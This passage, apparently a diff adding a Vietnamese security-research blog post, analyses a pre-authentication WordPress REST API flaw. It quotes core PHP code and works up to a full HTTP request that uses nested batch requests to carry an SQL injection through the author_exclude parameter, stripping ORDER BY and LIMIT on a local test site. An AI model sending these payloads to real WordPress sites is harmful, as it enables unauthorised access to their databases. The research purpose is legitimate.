+</span></span><span class="line"><span class="cl">       <span class="nv">$to_unset</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;scheme&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">       <span class="nv">$to_unset</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;host&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">       <span class="nv">$url</span>        <span class="o">=</span> <span class="s1">&#39;placeholder://placeholder&#39;</span> <span class="o">.</span> <span class="nv">$url</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="nv">$parts</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//... 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>Nếu path bắt đầu bằng <code>//</code> thì sẽ tự động thêm prefix <code>placeholder:</code> như một HTTP Scheme, lúc này chỉ cần fuzz thêm các ký tự đặc biệt vào url để lỗi trong quá trình parse host_name hay gì khác tương tự là sẽ hit được điều kiện [3]</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;method&#34;</span><span class="p">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;//@!@#aaaaaaaaa&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Payload ở thời điểm hiện tại như bên dưới, và request <code>/wp/v2/users</code> sẽ được xử lý và có thể truyền vào bất kỳ param với giá trị nào cho handler của request <code>/wp/v2/posts</code> vì input ở <code>/wp/v2/users</code> chỉ validate dựa theo schema của endpoint này mà thôi :)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;requests&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;method&#34;</span><span class="p">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;//@!@#aaaaaaaaa&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;method&#34;</span><span class="p">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/wp/v2/users&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;body&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;fooooo&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;email&#34;</span><span class="p">:</span><span class="s2">&#34;foo@gmail.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;Abcd@1234&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;method&#34;</span><span class="p">:</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/wp/v2/posts&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;body&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;param&#34;</span><span class="p">:</span><span class="s2">&#34;ony need handler&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="cve-2026-60137---sql-injection-via-author__not_in-parameter">#CVE-2026-60137 - SQL Injection via author__not_in Parameter<a hidden class="anchor" aria-hidden="true" href="#cve-2026-60137---sql-injection-via-author__not_in-parameter">#</a></h3>
+<h4 id="patch-analysis">#Patch Analysis<a hidden class="anchor" aria-hidden="true" href="#patch-analysis">#</a></h4>
+<p>Về lỗ hổng SQL Injection, ta có thể nhận ra ngay sau khi quan sát từ bản diff,
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/5.png"></p>
+<p>nó xuất hiện tại hàm <code>get_posts()</code> thông qua tham số <code>author__not_in</code> tại [4]:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/class-wp-query.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">get_posts</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parse_query</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	       <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">array_unique</span><span class="p">(</span> <span class="nx">array_map</span><span class="p">(</span> <span class="s1">&#39;absint&#39;</span><span class="p">,</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	       <span class="nx">sort</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span> <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">	    <span class="nv">$author__not_in</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span> <span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;author__not_in&#39;</span><span class="p">]</span> <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	    <span class="nv">$where</span>         <span class="o">.=</span> <span class="s2">&#34; AND </span><span class="si">{</span><span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">posts</span><span class="si">}</span><span class="s2">.post_author NOT IN (</span><span class="si">$author__not_in</span><span class="s2">) &#34;</span><span class="p">;</span> <span class="c1">// [4]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span></code></pre></div><p>ta chỉ cần quan tâm là làm sao để chèn param <code>author__not_in</code> dưới dạng string mà không phải là array để không bị cast sang absint.</p>
+<p>Bước này thì nhờ thằng bạn AI hỗ trợ tìm ra các endpoint có thể reach được hàm này. Kết quả có 3 ứng cử viên như sau:
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/7.png"></p>
+<p>Cả ba endpoint đều sử dụng <code>get_items_permission_check</code> callback và auto public :)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/endpoints/class-wp-rest-search-controller.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">	 * Checks if a given request has access to search content.
+</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
+</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @since 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
+</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @param WP_REST_Request $request Full details about the request.
+</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @return true|WP_Error True if the request has search access, WP_Error object otherwise.
+</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">get_items_permission_check</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p>Pick đại route <code>/wp/v2/posts</code> phân tích thì thấy nó gọi hàm <code>get_items</code> callback :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">get_items</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$parameter_mappings</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;author&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;author__in&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;author_email&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;author_email&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;author_exclude&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;author__not_in&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="c1">//...  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="s1">&#39;offset&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;offset&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;order&#39;</span>          <span class="o">=&gt;</span> <span class="s1">&#39;order&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;parent&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;parent__in&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;parent_exclude&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;parent__not_in&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;per_page&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;number&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="nv">$prepared_args</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$parameter_mappings</span> <span class="k">as</span> <span class="nv">$api_param</span> <span class="o">=&gt;</span> <span class="nv">$wp_param</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">       <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$registered</span><span class="p">[</span> <span class="nv">$api_param</span> <span class="p">],</span> <span class="nv">$request</span><span class="p">[</span> <span class="nv">$api_param</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">          <span class="nv">$prepared_args</span><span class="p">[</span> <span class="nv">$wp_param</span> <span class="p">]</span> <span class="o">=</span> <span class="nv">$request</span><span class="p">[</span> <span class="nv">$api_param</span> <span class="p">];</span>  
+</span></span><span class="line"><span class="cl">       <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span></code></pre></div><p>Quan sát thì ta có thể control được <code>author__not_in</code> thông qua request param là <code>author_exclude</code>. Nhưng điều này không có nghĩa là nếu ta truy cập trực tiếp vào route <code>GET /wp/v2/posts</code> thì có thể trigger được Preauth SQL injection.</p>
+<p>Bởi vì như đã đề cập từ đầu, khi xử lý REST API endpoint thì hàm <code>dispatch()</code> sẽ thực hiện một loạt các input validation ở phía trước để check đảm bảo đủ param truyền vào và value đúng với data type quy định, cụ thể như bên dưới:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">get_collection_params</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$query_params</span> <span class="o">=</span> <span class="k">parent</span><span class="o">::</span><span class="na">get_collection_params</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$query_params</span><span class="p">[</span><span class="s1">&#39;author_exclude&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;description&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;Ensure result set excludes comments assigned to specific user IDs. Requires authorization.&#39;</span> <span class="p">),</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;type&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;array&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="s1">&#39;items&#39;</span>       <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">          <span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;integer&#39;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">       <span class="p">),</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//...
+</span></span></span></code></pre></div><p>param <code>author_exclude</code> đưa vào phải là một integer array nên không thể chèn string payload trực tiếp qua REST API.</p>
+<p>Đến đây, thì ta dần nhận ra rằng lỗ hổng này không chỉ dừng lại ở sự bất đồng bộ khi matching các handler mà còn nhấn mạnh vào khả năng bypass input validation. Nghĩa là ta hoàn toàn có thể bypass để truyền payload vào param <code>author_exclude</code> với string data type thông qua lỗ hổng ở batch request.</p>
+<h4 id="nested-batch-requests">#Nested batch requests<a hidden class="anchor" aria-hidden="true" href="#nested-batch-requests">#</a></h4>
+<p>Nice, mọi thứ trong tầm kiểm soát rồi thì <em>BOOOOOOOM!</em>
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/8.png"></p>
+<p>Đời không như là mơ, debug lại hàm <code>sanitize_params()</code> bên trong <code>dispatch()</code>, thì <code>method</code> phải nằm trong enum như bên dưới và không có <code>GET</code> :((</p>
+<p><img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/10.png"></p>
+<blockquote>
+<p><em>Batch không support <code>GET</code> method vậy thì làm sao gọi được <code>GET /wp/v2/posts</code> endpoint đó thông qua batch request?</em></p>
+</blockquote>
+<p>Như mình đã nhấn mạnh khả năng bypass input validation, thì tại sao ta không tận dụng nó để gọi một batch request con ở bên trong một batch request cha nhỉ? :))))</p>
+<p>Vì param sanitize dựa trên route hiện tại, nhưng lại dùng callback của handler khác để xử lý, nên việc kiểm tra <code>method</code> có nằm trong enum là không xảy ra đối với batch request con bên trong.</p>
+<p><img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/14.png">
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/15.png"></p>
+<h4 id="bypass-order-clause-limit">#Bypass ORDER clause limit<a hidden class="anchor" aria-hidden="true" href="#bypass-order-clause-limit">#</a></h4>
+<p>Tới đây thì có thể SQL Injection tùy ý nhưng bị hạn chế bởi global ORDER clause nên không thể exploit union-based được, query như sau:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">SQL_CALC_FOUND_ROWS</span><span class="w">  </span><span class="n">wp_posts</span><span class="p">.</span><span class="n">ID</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="n">wp_posts</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">WHERE</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">wp_posts</span><span class="p">.</span><span class="n">post_author</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1333333337</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">123</span><span class="c1">-- -  AND ((wp_posts.post_type = &#39;post&#39; AND (wp_posts.post_status = &#39;publish&#39;)))
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">wp_posts</span><span class="p">.</span><span class="n">post_date</span><span class="w"> </span><span class="k">DESC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="w">
+</span></span></span></code></pre></div><p>kết quả trả về:</p>
+<pre tabindex="0"><code>Error Code: 1250. Table &#39;wp_posts&#39; from one of the SELECTs cannot be used in global ORDER clause
+</code></pre><p>nên ta phải tìm một cách nào đó làm cho chương trình skip câu <code>limit</code> và <code>order by</code> đi, không nối chúng vào câu query chính nữa.</p>
+<p>Đầu tiên hãy xử lý câu limit trước:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">get_posts</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;nopaging&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	    <span class="k">if</span> <span class="p">(</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;posts_per_page&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>  <span class="c1">// [6]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	       <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;nopaging&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	       <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;nopaging&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;orderby&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;orderby&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;orderby&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">||</span> <span class="k">false</span> <span class="o">===</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;orderby&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	       <span class="nv">$orderby</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	       <span class="nv">$orderby</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">posts</span><span class="si">}</span><span class="s2">.post_date &#34;</span> <span class="o">.</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;order&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">	    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span> <span class="s1">&#39;none&#39;</span> <span class="o">===</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;orderby&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>  <span class="c1">// [7]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="nv">$orderby</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;nopaging&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">is_singular</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	    <span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="nv">$limits</span> <span class="o">=</span> <span class="s1">&#39;LIMIT &#39;</span> <span class="o">.</span> <span class="nv">$pgstrt</span> <span class="o">.</span> <span class="nv">$query_vars</span><span class="p">[</span><span class="s1">&#39;posts_per_page&#39;</span><span class="p">];</span> <span class="c1">// [8]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span></code></pre></div><ul>
+<li>Tại [8], biến <code>$limit</code> chứa câu limit được add vào cuối query, điều này chỉ xảy ra khi <code>$query_vars['nopaging']</code> rỗng nhưng ta có thể set cho nó giá trị nếu thõa điều kiện tại [6] để cắt đi câu limit</li>
+<li>Tại [7], nếu <code>$query_vars['orderby']</code> là <code>none</code> thì ORDER BY clause sẽ là rỗng</li>
+</ul>
+<p>Và ta có thể hoàn toàn kiểm soát các tham số này thông qua các request params <code>per_page</code> và <code>orderby</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">get_items</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$registered</span><span class="p">[</span><span class="s1">&#39;per_page&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	    <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;posts_per_page&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$request</span><span class="p">[</span><span class="s1">&#39;per_page&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$parameter_mappings</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;orderby&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;orderby&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//...
+</span></span></span></code></pre></div><p>Final payload:</p>
+<pre tabindex="0"><code>POST /wp-7.0.1/wp-json/batch/v1 HTTP/1.1
+Host: localhost:8088
+Content-Type: application/json
+Content-Length: 414
+
+{
+  &#34;requests&#34;: [{
+  &#34;method&#34;: &#34;POST&#34;,
+  &#34;path&#34;: &#34;//@!@#!&#34;
+},
+ {
+  &#34;method&#34;: &#34;POST&#34;,
+  &#34;path&#34;: &#34;/wp/v2/widgets&#34;,
+  &#34;body&#34;:{
+  &#34;requests&#34;: [{
+  &#34;method&#34;: &#34;POST&#34;,
+  &#34;path&#34;: &#34;//@!@#!&#34;
+},{
+  &#34;method&#34;: &#34;POST&#34;,
+  &#34;path&#34;: &#34;/wp/v2/widgets?per_page=-1&amp;orderby=none&amp;author_exclude=133333337)-- -&#34;
+},{
+  &#34;method&#34;: &#34;GET&#34;,
+  &#34;path&#34;: &#34;/wp/v2/posts&#34;
+}]}},{
+  &#34;method&#34;: &#34;POST&#34;,
+  &#34;path&#34;: &#34;/batch/v1&#34;
+}
+  ]
+}
+</code></pre><p>kết quả mất <code>ORDER BY</code> với <code>LIMIT</code> ròi hehe
+<img alt="alt text" loading="lazy" src="/images/wp2shell-some-notes-about-PreAuth-RCE-on-WordPress/17.png"></p>
+<p>Đến đây thì coi như đi được nửa đoạn đường rồi, nhưng trong khi đang stuck trên đường chain exploit lên RCE thì ngay ngày hôm sau, tác giả public writeup về full-chain của lỗ hổng luôn :)))</p>
+<p>Nên phần còn lại các bạn có thể đọc tiếp tại: <a href="https://slcyber.io/research-center/exploit-brokers-pay-500000-for-a-wordpress-rce-i-found-one-with-gpt5-6/#is-gpt5.6-sol-superhuman?">Exploit brokers pay $500,000 for a WordPress RCE. I found one with GPT5.6 Sol Ultra and $25 › Searchlight Cyber</a> :))</p>
+<p><em>Hiện tại chắc chỉ tới đây thôi nhỉ! Do bài này mình note hơi vội nên có thể sai sót, mong ai đi ngang qua đọc nếu thấy sai có thể góp ý với mình!
+Hy vọng sắp tới mình sẽ update thêm phần còn lại của bài viết này :))))</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://nhienit2010.github.io/tags/research/">Research</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://nhienit2010.github.io/posts/me_sqli_to_rce/">
+    <span class="title">Next »</span>
+    <br>
